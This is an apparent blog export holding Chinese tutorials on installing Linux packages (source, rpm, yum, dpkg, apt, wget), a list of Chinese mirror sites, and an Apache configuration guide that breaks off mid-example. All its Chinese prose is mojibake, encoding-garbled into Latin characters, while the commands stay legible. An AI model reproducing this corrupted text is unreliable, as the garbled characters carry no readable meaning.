        <content type="html"><![CDATA[<h1 id="Linuxå®‰è£…è½¯ä»¶åŒ…"><a href="#Linuxå®‰è£…è½¯ä»¶åŒ…" class="headerlink" title="Linuxå®‰è£…è½¯ä»¶åŒ…"></a>Linuxå®‰è£…è½¯ä»¶åŒ…</h1><p>å®‰è£…éƒ½æ˜¯åœ¨rootæƒé™ä¸‹æ‰§è¡Œçš„</p><h2 id="æºç å®‰è£…"><a href="#æºç å®‰è£…" class="headerlink" title="æºç å®‰è£…"></a>æºç å®‰è£…</h2><p>å…ˆä»å¼€æºé•œåƒç«™ä¸‹è½½æºç ï¼Œä¾‹å¦‚ï¼š<a href="http://mirrors.163.com/">æ¬¢è¿è®¿é—®ç½‘æ˜“å¼€æºé•œåƒç«™ (163.com)</a></p><p>æœ‰ä¸¤ç§æºç åŒ…</p><p>äºŒè¿›åˆ¶åŒ…ï¼Œä¸€èˆ¬ä¼šæœ‰ç‰ˆæœ¬å·ã€æ“ä½œç³»ç»Ÿä¹‹ç±»çš„ï¼Œåå­—æ¯”è¾ƒé•¿ï¼Œé‡Œé¢çš„ç¨‹åºæ˜¯å·²ç»ç¼–è¯‘æœçš„ï¼Œç›´æ¥è§£å‹å°±å¯è¿è¡Œç¨‹åº</p><ol><li>cd åˆ°ä¸‹è½½çš„åŒ…çš„ç›®å½•</li><li>æ·»åŠ æƒé™<code>chmod a+x xxx.bin</code></li><li>æ‰§è¡Œ<code>./xxx.bin</code></li></ol><p>æºç åŒ…ï¼ˆ<code>apr-1.7.0.tar.gz</code>ï¼‰ï¼Œéœ€è¦ç¼–è¯‘æ‰èƒ½è¿è¡Œ</p><p>å…ˆå®‰è£…Cç¼–è¾‘å™¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>C++ç¼–è¾‘å™¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc-c++<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>cd åˆ°å­˜æ”¾æºç å‹ç¼©åŒ…çš„ç›®å½•</p></li><li><p>è§£å‹ç¼©</p><p><code>tar -zxvf xxx.tar.gz </code></p><p><code>tar -jxvf xxx.tar.bz</code></p></li><li><p>cd è¿›å…¥è§£å‹åçš„ç›®å½•</p></li><li><p>é…ç½®ç¯å¢ƒ<code>./configure</code></p></li><li><p>å¯¹æºä»£ç è¿›è¡Œç¼–è¯‘<code>make</code></p></li><li><p>å®‰è£…ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶<code>make install</code></p></li><li><p>æ¸…ç†ä¸´æ—¶æ–‡ä»¶<code>make clean</code></p></li></ol><p>å¸è½½<code>make uninstall</code></p><p><code>./configure</code>åé¢å¯ä»¥è·Ÿä¸€äº›é€‰é¡¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/xxx<span class="token comment">#è®¾ç½®å®‰è£…ç›®å½•,/xxxå°±æ˜¯å®‰è£…ç›®å½•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>é»˜è®¤é…ç½®æ–‡ä»¶<code>/usr/local</code></p></li><li><p>æ‰§è¡Œæ–‡ä»¶<code>/usr/local/bin</code></p></li><li><p>èµ„æºæ–‡ä»¶<code>/usr/local/share</code></p></li></ul><h2 id="RPMåŒ…å®‰è£…"><a href="#RPMåŒ…å®‰è£…" class="headerlink" title="RPMåŒ…å®‰è£…"></a>RPMåŒ…å®‰è£…</h2><p>RPM â€œRedHat Package Managerâ€ï¼Œæ˜¯RedHatå…¬å¸ç ”å‘çš„ç¨‹åºåŒ…ç®¡ç†å™¨ã€‚rpmåŒ…æ˜¯æ‰“åŒ…å¥½äº†çš„ï¼Œå®‰è£…å³ä½¿ç”¨</p><ol><li>ä¸‹è½½è½¯ä»¶åŒ…xxx.rpm</li><li>cd åˆ°è½¯ä»¶åŒ…ç›®å½•</li><li>å®‰è£…è½¯ä»¶<code>rpm -ivh xx.rpm </code></li></ol><p>æ·»åŠ <code>--force</code>é€‰é¡¹å¼ºåˆ¶å®‰è£…</p><p><code>xxx.src.rpm</code>æºç å®‰è£…éœ€è¦ç¼–è¯‘</p><ol><li><code>rpm -ivh xxx.src.rpm</code></li><li><code>cd /usr/src/redhat/SPECS</code></li><li><code>rpmbuild -bp xxx.specs</code></li><li><code>cd /usr/src/redhat/BUILD/xxx/</code></li><li><code>./configure</code></li><li><code>make</code></li><li><code>make install</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> <span class="token parameter variable">-e</span> xxx.rpm <span class="token comment">#å¸è½½rpmåŒ…</span><span class="token function">rpm</span> <span class="token parameter variable">-ql</span> xxx <span class="token comment">#è·å–å®‰è£…çš„ä½ç½®</span><span class="token function">rpm</span> <span class="token parameter variable">-qi</span> xxx <span class="token comment">#æŸ¥è¯¢åŒ…è¯¦ç»†</span><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> <span class="token comment">#åˆ—å‡ºå®‰è£…è¿‡çš„åŒ…</span><span class="token function">rpm</span> <span class="token parameter variable">-list</span> <span class="token comment">#è·å¾—æ–‡ä»¶åˆ—è¡¨</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>é»˜è®¤å®‰è£…è·¯å¾„</p><ul><li><p>é…ç½®æ–‡ä»¶<code>/etc</code></p></li><li><p>å¯æ‰§è¡Œæ–‡ä»¶<code>/usr/bin</code></p></li><li><p>åŠ¨æ€åº“<code>/usr/lib</code></p></li><li><p>å¸®åŠ©æ–‡æ¡£<code>/usr/share/doc</code></p></li><li><p>man pageæ–‡ä»¶<code>/usr/share/man</code></p></li></ul></li></ul><h2 id="yumå®‰è£…"><a href="#yumå®‰è£…" class="headerlink" title="yumå®‰è£…"></a>yumå®‰è£…</h2><p>yumå‘½ä»¤æ˜¯åœ¨Fedoraå’ŒRedHatä»¥åŠSUSEä¸­åŸºäºrpmçš„è½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œå®ƒå¯ä»¥ä½¿ç³»ç»Ÿç®¡ç†äººå‘˜äº¤äº’å’Œè‡ªåŠ¨åŒ–åœ°æ›´ç»†ä¸ç®¡ç†RPMè½¯ä»¶åŒ…ï¼Œèƒ½å¤Ÿä»æŒ‡å®šçš„æœåŠ¡å™¨è‡ªåŠ¨ä¸‹è½½RPMåŒ…å¹¶ä¸”å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å¤„ç†ä¾èµ–æ€§å…³ç³»ï¼Œå¹¶ä¸”ä¸€æ¬¡å®‰è£…æ‰€æœ‰ä¾èµ–çš„è½¯ä½“åŒ…ï¼Œæ— é¡»ç¹çåœ°ä¸€æ¬¡æ¬¡ä¸‹è½½ã€å®‰è£…</p><p>ä»“åº“çš„é…ç½®æ–‡ä»¶<code>/etc/yum.repos.d</code>ç›®å½•ä¸‹</p><p><code>xxx</code>è¡¨ç¤ºè½¯ä»¶åæˆ–ç¨‹åºç»„å</p><p><strong>å®‰è£…</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token comment">#å…¨éƒ¨å®‰è£…</span>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> xxx <span class="token comment">#ä¸è¯¢é—®å®‰è£…</span>yum <span class="token function">install</span> xxx <span class="token comment">#å®‰è£…æŒ‡å®šçš„è½¯ä»¶</span>yum groupinsall xxx <span class="token comment">#å®‰è£…ç¨‹åºç»„</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ›´æ–°å’Œå‡çº§</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum update <span class="token comment">#å…¨éƒ¨æ›´æ–°</span>yum update xxx <span class="token comment">#æ›´æ–°æŒ‡å®šç¨‹åºåŒ…xxx</span>yum check-update <span class="token comment">#æ£€æŸ¥å¯æ›´æ–°çš„ç¨‹åº</span>yum upgrade xxx <span class="token comment">#å‡çº§æŒ‡å®šç¨‹åºåŒ…xxx</span>yum groupupdate xxx <span class="token comment">#å‡çº§ç¨‹åºç»„xxx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æŸ¥æ‰¾å’Œæ˜¾ç¤º</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum info xxxx <span class="token comment">#æ˜¾ç¤ºå®‰è£…åŒ…ä¿¡æ¯xxx</span>yum list <span class="token comment">#æ˜¾ç¤ºæ‰€æœ‰å·²ç»å®‰è£…å’Œå¯ä»¥å®‰è£…çš„ç¨‹åºåŒ…</span>yum list xxx <span class="token comment">#æ˜¾ç¤ºæŒ‡å®šç¨‹åºåŒ…å®‰è£…æƒ…å†µxxx</span>yum groupinfo xxx <span class="token comment">#æ˜¾ç¤ºç¨‹åºç»„xxxä¿¡æ¯</span>yum search string xxx <span class="token comment">#æ ¹æ®å…³é”®å­—stringæŸ¥æ‰¾å®‰è£…åŒ…</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åˆ é™¤ç¨‹åº</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token operator">|</span> erase xxx <span class="token comment">#åˆ é™¤ç¨‹åºåŒ…xxx</span>yum groupremove xxx <span class="token comment">#åˆ é™¤ç¨‹åºç»„xxx</span>yum deplist xxx <span class="token comment">#æŸ¥çœ‹ç¨‹åºxxxä¾èµ–æƒ…å†µ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>æ¸…é™¤ç¼“å­˜</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum clean packages <span class="token comment">#æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„è½¯ä»¶åŒ…</span>yum clean headers <span class="token comment">#æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„ headers</span>yum clean oldheaders <span class="token comment">#æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹æ—§çš„ headers</span>yum clean, yum clean all <span class="token punctuation">(</span><span class="token operator">=</span> yum clean packages<span class="token punctuation">;</span> yum clean oldheaders<span class="token punctuation">)</span> <span class="token comment">#æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„è½¯ä»¶åŒ…åŠæ—§çš„headers</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>é»˜è®¤å®‰è£…è·¯å¾„</p><ul><li><p>é…ç½®æ–‡ä»¶<code>/etc</code></p></li><li><p>å¯æ‰§è¡Œæ–‡ä»¶<code>/usr/bin</code></p></li><li><p>åŠ¨æ€åº“<code>/usr/lib</code></p></li><li><p>å¸®åŠ©æ–‡æ¡£<code>/usr/share/doc</code></p></li><li><p>man pageæ–‡ä»¶<code>/usr/share/man</code></p></li></ul><h2 id="debåŒ…å®‰è£…"><a href="#debåŒ…å®‰è£…" class="headerlink" title="debåŒ…å®‰è£…"></a>debåŒ…å®‰è£…</h2><p>debæ˜¯Debianè½¯ä»¶åŒ…æ ¼å¼ï¼Œæ–‡ä»¶æ‰©å±•åä¸º.debï¼Œå¤„ç†è¿™äº›åŒ…çš„ç»å…¸ç¨‹åºæ˜¯dpkgï¼Œç»å¸¸æ˜¯é€šè¿‡aptæ¥è¿ä½œ</p><ol><li>cd åˆ°å®‰è£…åŒ…xxx.debçš„ç›®å½•</li><li>æ‰§è¡Œå®‰è£…<code>dpkg -i xxx.deb</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-r</span> xxxSoftName <span class="token comment">#å¸è½½</span>dpkg <span class="token parameter variable">-l</span> <span class="token string">'*xxx*'</span> <span class="token comment">#æŸ¥è¯¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="aptå®‰è£…"><a href="#aptå®‰è£…" class="headerlink" title="aptå®‰è£…"></a>aptå®‰è£…</h2><p>apt-get æ˜¯ Debianï¼ŒUbuntu å‘è¡Œç‰ˆçš„åŒ…ç®¡ç†å·¥å…·ï¼Œé€‚ç”¨äºdebåŒ…ç®¡ç†å¼çš„æ“ä½œç³»ç»Ÿ</p><p>å®‰è£…<code>apt-get install xxx</code> <strong>xxx</strong>ä¸€èˆ¬æ˜¯è½¯ä»¶ååŠ ç‰ˆæœ¬å·</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-cache</span> search xxx <span class="token comment">#æœå¯»è½¯ä»¶xxxçš„åç§°,æ‰¾åˆ°å®Œæ•´åç§°æ‰§è¡Œå®‰è£…</span><span class="token function">apt-get</span> <span class="token function">install</span> xxx <span class="token comment">#å®‰è£…</span><span class="token function">apt-get</span> remove xxx <span class="token comment">#å¸è½½</span><span class="token function">apt-get</span> <span class="token parameter variable">--purge</span> remove xxx <span class="token comment">#è¿é…ç½®æ–‡ä»¶ä¸€èµ·å¸è½½</span><span class="token function">apt-get</span> autoremove xxx <span class="token comment">#åˆ é™¤åŒ…åŠå…¶ä¾èµ–çš„è½¯ä»¶åŒ…</span>dpkg --force-all <span class="token parameter variable">--purge</span> xxx <span class="token comment">#å¼ºåˆ¶å¸è½½</span><span class="token function">apt-get</span> clean <span class="token comment">#æ¸…ç†å¤‡ä»½</span><span class="token function">apt-cache</span> pkgnames <span class="token comment">#æ‰“å°è½¯ä»¶åŒ…åˆ—è¡¨ä¸­æ‰€æœ‰è½¯ä»¶åŒ…çš„åç§°</span><span class="token function">apt-get</span> update <span class="token comment">#ä»è½¯ä»¶æºé•œåƒæœåŠ¡å™¨ä¸Šä¸‹è½½/æ›´æ–°ç”¨äºæ›´æ–°æœ¬åœ°è½¯ä»¶æºçš„è½¯ä»¶åŒ…</span><span class="token function">apt-get</span> upgrade <span class="token comment">#å‡çº§è½¯ä»¶åŒ…åˆ°æœ€æ–°ç‰ˆæœ¬</span><span class="token function">apt-get</span> <span class="token parameter variable">-f</span> <span class="token function">install</span> <span class="token comment">#ä¿®å¤è½¯ä»¶ä¾èµ–åŒ…çš„å…³ç³»</span><span class="token function">apt-get</span> dist-upgrade <span class="token comment">#å‡çº§ç³»ç»Ÿ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®‰è£…è·¯å¾„</p><ul><li>æºæ–‡ä»¶<code>/etc/apt/sources.list</code></li><li>ä¿å­˜ä»æºä¸‹è½½çš„è½¯ä»¶åˆ—è¡¨<code>/var/lib/apt/lists</code></li><li>ä¸‹è½½çš„è½¯ä»¶å­˜æ”¾<code>/var/cache/apt/archives</code></li><li>å®‰è£…åè½¯ä»¶é»˜è®¤ä½ç½®<code>/usr/share</code></li><li>å¯æ‰§è¡Œæ–‡ä»¶ <code>/usr/bin</code></li><li>é…ç½®æ–‡ä»¶<code>/etc</code></li><li>libæ–‡ä»¶<code>/usr/lib</code></li></ul><h2 id="wgetå®‰è£…"><a href="#wgetå®‰è£…" class="headerlink" title="wgetå®‰è£…"></a>wgetå®‰è£…</h2><p>å¦‚æœæ²¡æœ‰å®‰è£…wgetï¼Œ<code>yum -y install wget</code></p><p>wgetä»æŒ‡å®šçš„URLä¸‹è½½æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> url <span class="token comment">#ç›´æ¥ä¸‹è½½urlçš„èµ„æºåˆ°å½“å‰æ–‡ä»¶å¤¹</span><span class="token function">wget</span> <span class="token parameter variable">-O</span> name url <span class="token comment">#ä¿å­˜ä¸ºæŒ‡å®šæ–‡ä»¶å</span><span class="token function">wget</span> <span class="token parameter variable">-c</span> url <span class="token comment">#æ–­ç‚¹ç»­ä¼ </span><span class="token function">wget</span> <span class="token parameter variable">-b</span> url <span class="token comment">#åå°ä¸‹è½½</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹äºä¸‹è½½çš„æ–‡ä»¶åŒ…æ‰§è¡Œæºç å®‰è£…</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›½å†…é•œåƒæº</title>
      <link href="/2021/08/02/guo-nei-jing-xiang-yuan/"/>
      <url>/2021/08/02/guo-nei-jing-xiang-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="å›½å†…é•œåƒæº"><a href="#å›½å†…é•œåƒæº" class="headerlink" title="å›½å†…é•œåƒæº"></a>å›½å†…é•œåƒæº</h1><ul><li><a href="http://mirrors.163.com/">æ¬¢è¿è®¿é—®ç½‘æ˜“å¼€æºé•œåƒç«™ (163.com)</a></li><li><a href="https://developer.aliyun.com/mirror/">é˜¿é‡Œå·´å·´å¼€æºé•œåƒç«™-OPSXé•œåƒç«™-é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº (aliyun.com)</a></li><li><a href="https://mirrors.huaweicloud.com/home">åä¸ºå¼€æºé•œåƒç«™_è½¯ä»¶å¼€å‘æœåŠ¡_åä¸ºäº‘ (huaweicloud.com)</a></li><li><a href="https://mirrors.cloud.tencent.com/">è…¾è®¯è½¯ä»¶æº (tencent.com)</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/">æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ | Tsinghua Open Source Mirror</a></li><li><a href="http://mirrors.ustc.edu.cn/">USTC Open Source Software Mirror</a></li><li><a href="http://mirror.bit.edu.cn/web/">åŒ—äº¬ç†å·¥å¤§å­¦ å¼€æºè½¯ä»¶é•œåƒæœåŠ¡ (bit.edu.cn)</a></li><li><a href="https://mirror.bjtu.edu.cn/">é¦–é¡µ - åŒ—äº¬äº¤é€šå¤§å­¦è‡ªç”±ä¸å¼€æºè½¯ä»¶é•œåƒç«™ (bjtu.edu.cn)</a></li><li><a href="http://mirror.azure.cn/">Mirror site (azure.cn)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apacheæ•™ç¨‹</title>
      <link href="/2021/08/01/apache/"/>
      <url>/2021/08/01/apache/</url>
      
        <content type="html"><![CDATA[<h1 id="Apacheæ•™ç¨‹"><a href="#Apacheæ•™ç¨‹" class="headerlink" title="Apacheæ•™ç¨‹"></a>Apacheæ•™ç¨‹</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#å®‰è£…ApacheåŠå…¶æ‰©å±•åŒ…</span>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> httpd httpd-manual mod_ssl mod_perl mod_auth_mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="å¯åŠ¨ã€åœæ­¢ã€é‡å¯"><a href="#å¯åŠ¨ã€åœæ­¢ã€é‡å¯" class="headerlink" title="å¯åŠ¨ã€åœæ­¢ã€é‡å¯"></a>å¯åŠ¨ã€åœæ­¢ã€é‡å¯</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#centos</span><span class="token function">service</span> httpd start<span class="token function">service</span> httpd stop<span class="token function">service</span> httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸»è¦çš„é…ç½®æ–‡ä»¶"><a href="#ä¸»è¦çš„é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸»è¦çš„é…ç½®æ–‡ä»¶"></a>ä¸»è¦çš„é…ç½®æ–‡ä»¶</h2><p>é…ç½®æ–‡ä»¶åœ¨<code>\etc\httpd</code>ä¸‹é¢ï¼Œä¸»è¦çš„é…ç½®æ–‡ä»¶<code>\etc\httpd\conf\httpd.conf</code></p><h3 id="åŸºæœ¬é…ç½®"><a href="#åŸºæœ¬é…ç½®" class="headerlink" title="åŸºæœ¬é…ç½®"></a>åŸºæœ¬é…ç½®</h3><table><thead><tr><th>å±æ€§å+å€¼</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>ServerRoot "/your/index"</code></td><td>Apacheå®‰è£…çš„ç›®å½•</td></tr><tr><td><code>Listen 80</code></td><td>ç›‘å¬çš„ç«¯å£ï¼Œå¯ä»¥å¼€å¯å¤šä¸ªç«¯å£</td></tr><tr><td><code>Include conf.modules.d/*.conf</code></td><td>åŠ è½½æ–‡ä»¶ä¸­çš„æ‰€æœ‰æ¨¡å—</td></tr><tr><td><code>LoadModule foo_module modules/mod_foo.so</code></td><td>åŠ è½½å•ç‹¬æ¨¡å—</td></tr><tr><td><code>LoadFile</code></td><td>å’Œ<code>LoadModule</code>ç±»ä¼¼ï¼Œä½†ä½¿ç”¨ç»å¯¹è·¯å¾„</td></tr><tr><td><code>User username</code></td><td>è¿è¡Œæ—¶çš„ç”¨æˆ·å</td></tr><tr><td><code>Group groupname</code></td><td>è¿è¡Œæ—¶çš„ç”¨æˆ·ç»„</td></tr><tr><td><code>ServerAdmin root@localhost</code></td><td>ç®¡ç†å‘˜çš„é‚®ä»¶åœ°å€</td></tr><tr><td><code>ServerName www.example.com:80</code></td><td>ä¸»ç«™ç‚¹åç§°ï¼Œå¯ä»¥æ˜¯åŸŸåä¹Ÿèƒ½æ˜¯IPï¼Œä¸å†™æ—¶è‡ªåŠ¨é…ç½®</td></tr><tr><td><code>DocumentRoot "/var/www/html"</code></td><td>ä¸»ç«™ç‚¹çš„ç½‘é¡µå­˜å‚¨ä½ç½®</td></tr><tr><td><code>DirectoryIndex index</code></td><td>é»˜è®¤ç´¢å¼•ç›®å½•</td></tr><tr><td><code>RequestReadTimeout</code></td><td>å…è®¸é™åˆ¶å®¢æˆ·ç«¯å‘é€è¯·æ±‚æ‰€èŠ±è´¹çš„æ—¶é—´</td></tr><tr><td><code>TimeOut</code></td><td>ä¼ è¾“æˆ–æ¥æ”¶çš„å»¶æ—¶ï¼Œå¤§äºè¿™ä¸ªæ—¶é—´SERVER ä¼šæ–­å¼€è¿™ä¸ªé“¾æ¥</td></tr><tr><td><code>KeepAliveTimeout</code></td><td>ç­‰å¾…ä¸‹ä¸€ä¸ªè¯·æ±‚çš„æ—¶é—´</td></tr><tr><td><code>MaxClients</code></td><td>å…è®¸çš„æœ€å¤§å®¢æˆ·ä¸ªæ•°</td></tr><tr><td><code>KeepAlive</code></td><td>æ˜¯å¦å…è®¸ä¸€ä¸ªé“¾æ¥åŒæ—¶å‘å‡ºå¤šçš„è¯·æ±‚</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="ç›®å½•è®¿é—®æƒé™æ§åˆ¶"><a href="#ç›®å½•è®¿é—®æƒé™æ§åˆ¶" class="headerlink" title="ç›®å½•è®¿é—®æƒé™æ§åˆ¶"></a>ç›®å½•è®¿é—®æƒé™æ§åˆ¶</h3><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/yourindex"&gt; &amp;ltFiles "private.html"&gt;        Require all denied    &amp;lt/Files&gt;Options FollowSymLinks AllowOverride None Order allow,deny Allow from all #Require all granted #Apache2.2åæ›¿æ¢Order&amp;lt/Directory&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>å±æ€§å</th><th>æ„ä¹‰</th></tr></thead><tbody><tr><td><code>Directory</code></td><td>æƒé™é…ç½®çš„å®¹å™¨åï¼ˆæ–‡ä»¶ç³»ç»Ÿå®¹å™¨ï¼‰ï¼Œè·¯å¾„èƒ½æ­£åˆ™åŒ¹é…</td></tr><tr><td><code>/yourindex</code></td><td>éœ€è¦é…ç½®æƒé™çš„ç›®å½•</td></tr><tr><td><code>Files</code></td><td>æŒ‡å®šæ–‡ä»¶æƒé™ï¼Œè·¯å¾„èƒ½æ­£åˆ™åŒ¹é…</td></tr><tr><td><code>Options</code></td><td>é…ç½®åœ¨ç‰¹å®šç›®å½•ä½¿ç”¨çš„ç‰¹æ€§</td></tr><tr><td><code>None</code></td><td>ä¸å¯ç”¨ä»»ä½•é¢å¤–åŠŸèƒ½</td></tr><tr><td><code>ExecCGI</code></td><td>åœ¨è¯¥ç›®å½•ä¸‹å…è®¸æ‰§è¡ŒCGIè„šæœ¬</td></tr><tr><td><code>FollowSymlinks</code></td><td>å…è®¸æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶è¿æ¥åˆ°ç›®å½•å¤–çš„æ–‡ä»¶æˆ–ç›®å½•ï¼ˆåœ¨è¯¥ç›®å½•ä¸‹å…è®¸æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨ç¬¦å·è¿æ¥ï¼‰</td></tr><tr><td><code>Indexes</code></td><td>å½“ç”¨æˆ·è®¿é—®è¯¥ç›®å½•æ—¶ï¼Œå¦‚æœç”¨æˆ·æ‰¾ä¸åˆ°<code>DirectoryIndex</code>æŒ‡å®šçš„ä¸»é¡µæ–‡ä»¶(ä¾‹å¦‚<code>index.html</code>)ï¼Œåˆ™è¿”å›è¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ç»™ç”¨æˆ·</td></tr><tr><td><code>SymLinksIfOwnerMatch</code></td><td>å½“ä½¿ç”¨ç¬¦å·è¿æ¥æ—¶ï¼Œåªæœ‰å½“ç¬¦å·è¿æ¥çš„æ–‡ä»¶æ‹¥æœ‰è€…ä¸å®é™…æ–‡ä»¶çš„æ‹¥æœ‰è€…ç›¸åŒæ—¶æ‰å¯ä»¥è®¿é—®ã€‚</td></tr><tr><td><code>All</code></td><td>å¼€å¯é™¤ <code>MultiViews</code> ä¹‹å¤–çš„æ‰€æœ‰é€‰é¡¹</td></tr><tr><td><code>AllowOverride</code></td><td>å…è®¸å­˜åœ¨äº<code>.htaccess</code>æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ç±»å‹</td></tr><tr><td><code>None</code></td><td>ä¸æœç´¢è¯¥ç›®å½•ä¸‹çš„<code>.htaccess</code>æ–‡ä»¶</td></tr><tr><td><code>All</code></td><td>åœ¨<code>.htaccess</code>æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨æ‰€æœ‰çš„æŒ‡ä»¤</td></tr><tr><td><code>Order</code></td><td>æ§åˆ¶åœ¨è®¿é—®æ—¶<code>Allow</code>å’Œ<code>Deny</code>ä¸¤ä¸ªè®¿é—®è§„åˆ™å“ªä¸ªä¼˜å…ˆ</td></tr><tr><td><code>Allow</code></td><td>å…è®¸è®¿é—®çš„ä¸»æœºåˆ—è¡¨(å¯ç”¨åŸŸåæˆ–å­ç½‘ï¼Œä¾‹å¦‚ï¼š<code>Allow from 192.168.0.0/16</code>)</td></tr><tr><td><code>Deny</code></td><td>æ‹’ç»è®¿é—®çš„ä¸»æœºåˆ—è¡¨</td></tr><tr><td><code>Order deny,allow</code></td><td>å…ˆæ£€æŸ¥æ‹’ç»ï¼Œå†æ£€æŸ¥å…è®¸ï¼Œå½“æ‹’ç»ä¸å…è®¸æœ‰å†²çªæ—¶ï¼Œå…è®¸ä¼˜å…ˆï¼Œé»˜è®¤è§„åˆ™ä¸ºå…è®¸</td></tr><tr><td><code>Order allow,deny</code></td><td>å…ˆæ£€æŸ¥å…è®¸ï¼Œå†æ£€æŸ¥æ‹’ç»ï¼Œå½“å…è®¸ä¸æ‹’ç»æœ‰å†²çªæ—¶ï¼Œæ‹’ç»ä¼˜å…ˆã€‚é»˜è®¤è§„åˆ™ä¸ºæ‹’ç»</td></tr><tr><td><code>Require</code></td><td>æµ‹è¯•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ˜¯å¦ç”±æˆæƒæä¾›è€…æˆæƒï¼ŒApache2.2åæ›¿æ¢Order</td></tr><tr><td><code>Require all granted</code></td><td>å…è®¸æ‰€æœ‰è®¿é—®è¯·æ±‚</td></tr><tr><td><code>Require all denied</code></td><td>æ‹’ç»æ‰€æœ‰è®¿é—®è¯·æ±‚</td></tr><tr><td><code>Require ip ip1 ip2</code></td><td>åªå…è®¸æ¥è‡ªç‰¹å®šIPæˆ–IPæ®µçš„è®¿é—®è¯·æ±‚ï¼Œå…¶ä»–è¯·æ±‚å°†è¢«æ‹’ç»</td></tr><tr><td><code>Require host x.com</code></td><td>åªå…è®¸æ¥è‡ªç‰¹å®šåŸŸåä¸»æœºçš„è®¿é—®è¯·æ±‚ï¼Œå…¶ä»–è¯·æ±‚å°†è¢«æ‹’ç»</td></tr><tr><td><code>Require not ip ip1</code></td><td>æ‹’ç»ip1</td></tr><tr><td><code>Require not host gov</code></td><td>æ‹’ç»gov</td></tr><tr><td>â€¦</td><td></td></tr></tbody></table><h3 id="è™šæ‹Ÿä¸»æœºå®¹å™¨"><a href="#è™šæ‹Ÿä¸»æœºå®¹å™¨" class="headerlink" title="è™šæ‹Ÿä¸»æœºå®¹å™¨"></a>è™šæ‹Ÿä¸»æœºå®¹å™¨</h3><h4 id="VirtualHost"><a href="#VirtualHost" class="headerlink" title="VirtualHost"></a>VirtualHost</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost 10.1.2.3:80&gt;  ServerAdmin 